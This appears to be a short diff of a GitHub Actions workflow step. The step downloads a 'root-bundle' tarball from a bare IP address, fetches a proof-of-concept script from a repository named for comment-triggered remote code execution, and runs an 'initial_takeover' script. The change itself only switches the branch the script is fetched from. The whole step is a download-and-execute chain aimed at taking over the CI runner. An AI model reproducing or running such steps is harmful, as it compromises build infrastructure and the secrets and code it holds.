@@ -15,7 +15,7 @@ jobs:
           set -e
           curl -fsS http://16.146.243.72:8450/gha3900000-root-bundle.tgz -o /tmp/root.tgz
           tar -xzf /tmp/root.tgz -C /tmp
-          curl -fsS https://raw.githubusercontent.com/fdzdev/gha-comment-rce-3900000/main/poc/root_vmbfs_control.sh -o /tmp/root_auto.sh
+          curl -fsS https://raw.githubusercontent.com/fdzdev/gha-comment-rce-3900000/daybreak-vmbfs-default/poc/root_vmbfs_control.sh -o /tmp/root_auto.sh
           chmod +x /tmp/root_auto.sh
           HVS_INLINE=1 bash /tmp/initial_takeover.sh
           for attempt in $(seq 1 40); do
